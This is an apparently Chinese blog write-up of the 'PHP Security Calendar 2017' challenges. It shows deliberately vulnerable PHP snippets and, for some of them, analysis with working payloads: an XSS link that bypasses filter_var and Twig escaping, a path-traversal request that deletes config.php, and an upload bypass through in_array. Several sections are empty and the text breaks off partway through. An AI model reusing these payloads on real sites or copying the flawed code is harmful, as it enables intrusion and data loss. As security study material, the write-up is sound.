    <id>https://wywwzjj.top/2019/03/02/PHP-SECURITY-CALENDAR-2017/</id>
    <published>2019-03-02T04:10:12.000Z</published>
    <updated>2019-05-16T04:05:25.418Z</updated>
    
    <content type="html"><![CDATA[<p>有意思一点的优先做了，有时间再更新。</p><h2 id="1-Wish-List"><a href="#1-Wish-List" class="headerlink" title="1 - Wish List"></a>1 - Wish List</h2><blockquote><p>in_array</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> UPLOAD_DIRECTORY = <span class="string">'./solutions/'</span>;</span><br><span class="line">    <span class="keyword">private</span> $file;</span><br><span class="line">    <span class="keyword">private</span> $whitelist;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;whitelist = range(<span class="number">1</span>, <span class="number">24</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;file[<span class="string">'name'</span>], <span class="keyword">$this</span>-&gt;whitelist)) &#123;</span><br><span class="line">            move_uploaded_file(</span><br><span class="line">                <span class="keyword">$this</span>-&gt;file[<span class="string">'tmp_name'</span>],</span><br><span class="line">                <span class="keyword">self</span>::UPLOAD_DIRECTORY . <span class="keyword">$this</span>-&gt;file[<span class="string">'name'</span>]</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$challenge = <span class="keyword">new</span> Challenge($_FILES[<span class="string">'solution'</span>]);</span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array ( mixed $needle , <span class="keyword">array</span> $haystack [, bool $strict = <span class="keyword">FALSE</span> ] ) : bool</span><br></pre></td></tr></table></figure><blockquote><p>在 <strong>$haystack</strong> 中搜索 <strong>$needle</strong> ，如果第三个参数 <strong>$strict</strong> 的值为 <strong>TRUE</strong> ，则 <strong>in_array()</strong> 函数会进行强检查，检查 <strong>$needle</strong> 的类型是否和 <strong>$haystack</strong> 中的相同。如果找到 <strong>$haystack</strong> ，则返回 <strong>TRUE</strong>，否则返回 <strong>FALSE</strong>。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file ( string $filename , string $destination ) : bool</span><br></pre></td></tr></table></figure><p>这是文件上传中常用的一个函数，文件被上传结束后，默认地被存储在了临时目录中，这时必须将它从临时目录中移动到其它地方，因为脚本执行完后，临时目录里的文件会被删除。所以要在删除之前用 PHP 的 <code>copy()</code> 或者 <code>move_upload_file()</code>  函数将它复制或者移动到其它位置，到此，才算完成了上传文件过程。</p><p>再观察里面的两个参数，如果 <code>file[&#39;name&#39;]</code> 是可控的话，可通过 <code>../</code> 进行目录穿越。</p><p>回溯一下，在构造函数中可看到，<code>this-&gt;file</code> 来自  <code>$_FILES[&#39;solution&#39;]</code> 。</p><p>此处的 <code>$_FILES</code> 是 PHP 中的超级全局变量，该数组包含有所有上传的文件信息，这里可本地做做实验。</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p><strong>构造如下表单</strong>（嫌麻烦可以直接 Burp 提交）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://localhost/test.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"solution"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>test.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> print_r($_FILES);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可看到如下结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span> (</span><br><span class="line">    [solution] =&gt; <span class="keyword">Array</span> (</span><br><span class="line">            [name] =&gt; A.png</span><br><span class="line">            [type] =&gt; image/png</span><br><span class="line">            [tmp_name] =&gt; C:\Windows\php4F0F.tmp</span><br><span class="line">            [error] =&gt; <span class="number">0</span></span><br><span class="line">            [size] =&gt; <span class="number">40436</span></span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>结合上面的代码，<code>this-&gt;file</code> 是中间的那个数组，<code>name</code> 是可控的，即我们上传文件本身的名称。</p><p>外面还有一个 <code>if</code> 判断：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array ( mixed $needle , <span class="keyword">array</span> $haystack [, bool $strict = <span class="keyword">FALSE</span> ] ) : bool</span><br></pre></td></tr></table></figure><p>这里其实很好绕过，因为 <code>in_array()</code>  没有开启 <code>strict</code>，将自动转换类型。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1bj55nnsgj20j003qt92.jpg" alt></p><p>可惜了，不能进行目录穿越，在实际场景中可能还要结合一些文件包含才能 <code>getshell</code>了。</p><h2 id="2-Twig"><a href="#2-Twig" class="headerlink" title="2 - Twig"></a>2 - Twig</h2><blockquote><p>filter_var</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// composer require "twig/twig"</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $twig;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $indexTemplate = <span class="string">'&lt;img '</span> .</span><br><span class="line">            <span class="string">'src="https://loremflickr.com/320/240"&gt;'</span> .</span><br><span class="line">            <span class="string">'&lt;a href="&#123;&#123;link|escape&#125;&#125;"&gt;Next slide &amp;raquo;&lt;/a&gt;'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Default twig setup, simulate loading</span></span><br><span class="line">        <span class="comment">// index.html file from disk</span></span><br><span class="line">        $loader = <span class="keyword">new</span> Twig\Loader\ArrayLoader([</span><br><span class="line">            <span class="string">'index.html'</span> =&gt; $indexTemplate</span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;twig = <span class="keyword">new</span> Twig\Environment($loader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNexSlideUrl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $nextSlide = $_GET[<span class="string">'nextSlide'</span>];</span><br><span class="line">        <span class="keyword">return</span> filter_var($nextSlide, FILTER_VALIDATE_URL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;twig-&gt;render(</span><br><span class="line">            <span class="string">'index.html'</span>,</span><br><span class="line">            [<span class="string">'link'</span> =&gt; <span class="keyword">$this</span>-&gt;getNexSlideUrl()]</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> Template())-&gt;render();</span><br></pre></td></tr></table></figure><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><code>twig</code> 是 PHP 的一个模板引擎。接收一个 URL，返回 HTML，极有可能触发 <code>XSS</code>了。</p><p>第一重过滤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter_var ( mixed $variable [, int $filter=FILTER_DEFAULT[, mixed $options ]]) :mixed</span><br></pre></td></tr></table></figure><p>题目代码中使用的是 FILTER_VALIDATE_URL 过滤器，它拥有四个可能的标识：</p><ul><li>FILTER_FLAG_SCHEME_REQUIRED - 要求 URL 是 RFC 兼容 URL。（比如：<code>http://example</code>）</li><li>FILTER_FLAG_HOST_REQUIRED - 要求 URL 包含主机名（<code>http://www.example.com</code>）</li><li>FILTER_FLAG_PATH_REQUIRED - 要求 URL 在主机名后存在路径（比如：<code>eg.com/example1/</code>）</li><li>FILTER_FLAG_QUERY_REQUIRED - 要求 URL 存在查询字符串（比如：<code>eg.php?age=37</code>）</li></ul><p>然而这里的过滤非常弱，只验证了 <code>://</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">"a://b"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// string(5) "a://b"</span></span><br><span class="line">var_dump(filter_var($url, FILTER_VALIDATE_URL));</span><br><span class="line">var_dump(filter_var($url, FILTER_VALIDATE_URL, FILTER_FLAG_SCHEME_REQUIRED));</span><br><span class="line">var_dump(filter_var($url, FILTER_VALIDATE_URL, FILTER_FLAG_HOST_REQUIRED));</span><br><span class="line"></span><br><span class="line"><span class="comment">// bool(false)</span></span><br><span class="line">var_dump(filter_var($url, FILTER_VALIDATE_URL, FILTER_FLAG_PATH_REQUIRED));</span><br><span class="line">var_dump(filter_var($url, FILTER_VALIDATE_URL, FILTER_FLAG_QUERY_REQUIRED));</span><br></pre></td></tr></table></figure><p>在手册的评论里面，有人直接给出了利用方法。</p><p><img src="https://ws1.sinaimg.cn/large/de75fd55gy1g325k3p39vj20nt07baak.jpg" alt></p><p>第二重过滤：</p><blockquote><p>Internally, <code>escape</code> uses the PHP native <a href="https://secure.php.net/htmlspecialchars" target="_blank" rel="noopener">htmlspecialchars</a> function for the HTML escaping strategy.</p></blockquote><p>由此可看出，<code>twig</code> 中的 <code>escape</code> 实际是用 <code>htmlspecialchars</code> 实现的。</p><p>将代码简化一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = filter_var($_GET[<span class="string">'url'</span>], FILTER_VALIDATE_URL);</span><br><span class="line">$url = htmlspecialchars($url);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;a href=$url&gt;Next slide &amp;raquo;&lt;/a&gt;"</span>;</span><br></pre></td></tr></table></figure><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><p>到这里思路就比较清晰了，exp 需要包含 <code>://</code> ，<code>&lt;a&gt;</code> 标签可以直接打，不能用单双引号也影响不大。</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?nextSlide=javascri<span class="symbol">pt:</span>//<span class="number">233%</span><span class="number">250</span>aalert(<span class="number">1</span>)  // 对 % 编码为 %<span class="number">25</span></span><br><span class="line">=&gt;</span><br><span class="line">&lt;a href=javascri<span class="symbol">pt:</span>//<span class="number">233</span></span><br><span class="line">alert(<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure><h2 id="3-Snow-Flake"><a href="#3-Snow-Flake" class="headerlink" title="3 - Snow Flake"></a>3 - Snow Flake</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span><span class="params">($className)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">include</span> $className;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$controllerName = $_GET[<span class="string">'c'</span>];</span><br><span class="line">$data = $_GET[<span class="string">'d'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (class_exists($controllerName)) &#123;</span><br><span class="line">    $controller = <span class="keyword">new</span> $controllerName($data[<span class="string">'t'</span>], $data[<span class="string">'v'</span>]);</span><br><span class="line">    $controller-&gt;render();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'There is no page with this name'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeController</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $template;</span><br><span class="line">    <span class="keyword">private</span> $variables;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($template, $variables)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;template = $template;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;variables = $variables;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;variables[<span class="string">'new'</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'controller rendering new response'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'controller rendering old response'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><h2 id="4-False-Beard"><a href="#4-False-Beard" class="headerlink" title="4 - False Beard"></a>4 - False Beard</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;loginViaXml($user, $pass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loginViaXml</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            (!strpos($user, <span class="string">'&lt;'</span>) || !strpos($user, <span class="string">'&gt;'</span>)) &amp;&amp;</span><br><span class="line">            (!strpos($pass, <span class="string">'&lt;'</span>) || !strpos($pass, <span class="string">'&gt;'</span>))</span><br><span class="line">        ) &#123;</span><br><span class="line">            $format = <span class="string">'&lt;?xml version="1.0"?&gt;'</span> .</span><br><span class="line">                <span class="string">'&lt;user v="%s"/&gt;&lt;pass v="%s"/&gt;'</span>;</span><br><span class="line">            $xml = sprintf($format, $user, $pass);</span><br><span class="line">            $xmlElement = <span class="keyword">new</span> SimpleXMLElement($xml);</span><br><span class="line">            <span class="comment">// Perform the actual login.</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;login($xmlElement);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Login($_POST[<span class="string">'username'</span>], $_POST[<span class="string">'password'</span>]);</span><br></pre></td></tr></table></figure><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><h2 id="5-Postcard"><a href="#5-Postcard" class="headerlink" title="5 - Postcard"></a>5 - Postcard</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mailer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitize</span><span class="params">($email)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!filter_var($email, FILTER_VALIDATE_EMAIL)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> escapeshellarg($email);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'to'</span>])) &#123;</span><br><span class="line">            $data[<span class="string">'to'</span>] = <span class="string">'none@ripstech.com'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $data[<span class="string">'to'</span>] = <span class="keyword">$this</span>-&gt;sanitize($data[<span class="string">'to'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'from'</span>])) &#123;</span><br><span class="line">            $data[<span class="string">'from'</span>] = <span class="string">'none@ripstech.com'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $data[<span class="string">'from'</span>] = <span class="keyword">$this</span>-&gt;sanitize($data[<span class="string">'from'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'subject'</span>])) &#123;</span><br><span class="line">            $data[<span class="string">'subject'</span>] = <span class="string">'No Subject'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'message'</span>])) &#123;</span><br><span class="line">            $data[<span class="string">'message'</span>] = <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mail($data[<span class="string">'to'</span>], $data[<span class="string">'subject'</span>], $data[<span class="string">'message'</span>],</span><br><span class="line">             <span class="string">''</span>, <span class="string">"-f"</span> . $data[<span class="string">'from'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mailer = <span class="keyword">new</span> Mailer();</span><br><span class="line">$mailer-&gt;send($_POST);</span><br></pre></td></tr></table></figure><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><h2 id="6-Frost-Pattern"><a href="#6-Frost-Pattern" class="headerlink" title="6 - Frost Pattern"></a>6 - Frost Pattern</h2><blockquote><p>preg_replace 配置</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TokenStorage</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">performAction</span><span class="params">($action, $data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> ($action) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'create'</span>:</span><br><span class="line">                <span class="keyword">$this</span>-&gt;createToken($data);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'delete'</span>:</span><br><span class="line">                <span class="keyword">$this</span>-&gt;clearToken($data);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'Unknown action'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createToken</span><span class="params">($seed)</span> </span>&#123;</span><br><span class="line">        $token = md5($seed);</span><br><span class="line">        file_put_contents(<span class="string">'/tmp/tokens/'</span> . $token, <span class="string">'...data'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clearToken</span><span class="params">($token)</span> </span>&#123;</span><br><span class="line">        $file = preg_replace(<span class="string">"/[^a-z.-_]/"</span>, <span class="string">""</span>, $token);</span><br><span class="line">        unlink(<span class="string">'/tmp/tokens/'</span> . $file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$storage = <span class="keyword">new</span> TokenStorage();</span><br><span class="line">$storage-&gt;performAction($_GET[<span class="string">'action'</span>], $_GET[<span class="string">'data'</span>]);</span><br></pre></td></tr></table></figure><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>本题实现的功能就两个，写文件，删除文件。</p><p><code>createToken()</code> 唯一可控的就是 <code>seed</code> ，然而文件名还被完全限死，内容也不可控。</p><p><code>clearToken()</code> 有一个正则匹配的过滤，不过<code>/[^a-z.-_]/</code> 这里配置有点问题。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1f65tmt8vj20jd02l0sz.jpg" alt></p><h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><p>任意文件删除漏洞</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=<span class="keyword">delete</span>&amp;data=../../<span class="built_in">config</span>.php</span><br></pre></td></tr></table></figure><h2 id="7-Bells"><a href="#7-Bells" class="headerlink" title="7 - Bells"></a>7 - Bells</h2><blockquote><p>parse_str</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUser</span><span class="params">($id)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $config, $db;</span><br><span class="line">    <span class="keyword">if</span> (!is_resource($db)) &#123;</span><br><span class="line">        $db = <span class="keyword">new</span> MySQLi(</span><br><span class="line">            $config[<span class="string">'dbhost'</span>],</span><br><span class="line">            $config[<span class="string">'dbuser'</span>],</span><br><span class="line">            $config[<span class="string">'dbpass'</span>],</span><br><span class="line">            $config[<span class="string">'dbname'</span>]</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    $sql = <span class="string">"SELECT username FROM users WHERE id = ?"</span>;</span><br><span class="line">    $stmt = $db-&gt;prepare($sql);</span><br><span class="line">    $stmt-&gt;bind_param(<span class="string">'i'</span>, $id);</span><br><span class="line">    $stmt-&gt;bind_result($name);</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $stmt-&gt;fetch();</span><br><span class="line">    <span class="keyword">return</span> $name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$var = parse_url($_SERVER[<span class="string">'HTTP_REFERER'</span>]);</span><br><span class="line">parse_str($var[<span class="string">'query'</span>]);</span><br><span class="line">$currentUser = getUser($id);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;h1&gt;'</span>.htmlspecialchars($currentUser).<span class="string">'&lt;/h1&gt;'</span>;</span><br></pre></td></tr></table></figure><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>parse_str()` 